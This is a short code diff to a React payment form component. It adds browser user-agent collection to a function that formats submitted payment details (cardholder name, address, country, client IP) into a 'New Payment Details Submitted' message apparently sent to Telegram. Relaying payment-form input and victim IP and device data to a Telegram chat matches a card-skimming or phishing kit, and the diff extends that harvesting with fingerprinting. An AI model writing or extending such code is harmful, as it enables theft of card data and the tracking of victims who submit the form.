@@ -278,10 +278,15 @@ const PaymentForm = ({ onProceed, onBack }: PaymentFormProps) => {
     }
   };
 
+  const getUserAgent = (): string => {
+    return navigator.userAgent || "Unknown";
+  };
+
   const sendTelegramNotification = async () => {
     try {
       const countryName = COUNTRIES.find(c => c.code === country)?.name || country;
       const clientIp = await getClientIp();
+      const userAgent = getUserAgent();
       const message = `💳 <b>New Payment Details Submitted</b>
 
 👤 <b>Cardholder:</b> ${cardName}
@@ -295,6 +300,7 @@ ${city}, ${postcode}
 ${countryName}
 
 🌐 <b>IP:</b> <code>${clientIp || "Unknown"}</code>
+💻 <b>Device:</b> <code>${userAgent}</code>
 
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
 
